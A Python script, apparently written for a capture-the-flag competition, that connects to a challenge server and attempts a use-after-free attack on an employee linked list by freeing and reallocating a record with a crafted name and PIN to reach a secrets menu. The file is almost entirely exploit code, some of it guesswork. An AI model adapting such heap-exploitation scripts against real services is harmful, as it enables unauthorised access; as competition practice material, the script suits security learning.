#!/usr/bin/env python3
"""
Advanced UAF - manipulate linked list by creating specific pattern
Goal: make admin.next point to an employee with PIN 484,
then delete admin so our employee becomes the head
"""

import socket
import time
import struct

HOST = 'chals.uscc-cyberbowl-2025.ctf.institute'
PORT = 3013

def send_recv(sock, cmd):
    sock.sendall(cmd.encode() + b'\n')
    time.sleep(0.4)
    return sock.recv(8192).decode('latin-1', errors='ignore')

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(20)
    sock.connect((HOST, PORT))
    
    send_recv(sock, '')  # banner
    
    # Strategy: Create employee, delete it, create with crafted 'next' pointer
    # that points to admin's PIN field
    
    print("[*] Step 1: Create dummy employee")
    send_recv(sock, '1')
    send_recv(sock, 'Dummy')
    send_recv(sock, '9999')
    
    # List to get addresses
    data = send_recv(sock, '4')
    print(data[:600])
    
    # Parse admin and dummy addresses
    lines = data.split('\n')
    admin_addr = None
    dummy_addr = None
    
    for i, line in enumerate(lines):
        if 'Employee Id: 0x' in line:
            addr = line.split('Employee Id: ')[1].split()[0]
            # Look ahead for name
            for j in range(i, min(len(lines), i+5)):
                if 'Administrator' in lines[j]:
                    admin_addr = int(addr, 16)
                    print(f"[+] Admin at: {hex(admin_addr)}")
                    break
                elif 'Dummy' in lines[j]:
                    dummy_addr = int(addr, 16)
                    print(f"[+] Dummy at: {hex(dummy_addr)}")
                    break
    
    if admin_addr and dummy_addr:
        # Calculate where admin's PIN is
        admin_pin_addr = admin_addr + 28  # Assuming offset 28 for PIN
        print(f"[*] Admin PIN should be at: {hex(admin_pin_addr)}")
        
        # Delete dummy
        print(f"\n[*] Deleting dummy at {hex(dummy_addr)}")
        send_recv(sock, '2')
        send_recv(sock, hex(dummy_addr))
        
        # Now create new employee with crafted data
        # Try to make the next pointer or name overflow to hit admin's PIN
        print("\n[*] Creating crafted employee...")
        send_recv(sock, '1')
        
        # Name: try to cause some memory corruption
        # Use a name that's exactly 18 chars (max allowed)
        crafted_name = "A" * 18
        send_recv(sock, crafted_name)
        
        # PIN: try 484
        send_recv(sock, '484')
        
        # List again
        data = send_recv(sock, '4')
        print("\n[*] After UAF:")
        print(data[:600])
        
    # Try accessing secrets
    print("\n[*] Attempting access...")
    data = send_recv(sock, '3')
    print(data)
    
    time.sleep(1)
    try:
        more = sock.recv(4096).decode('latin-1', errors='ignore')
        print(more)
    except:
        pass
    
    sock.close()

if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print(f"Error: {e}")
        import traceback
        traceback.print_exc()
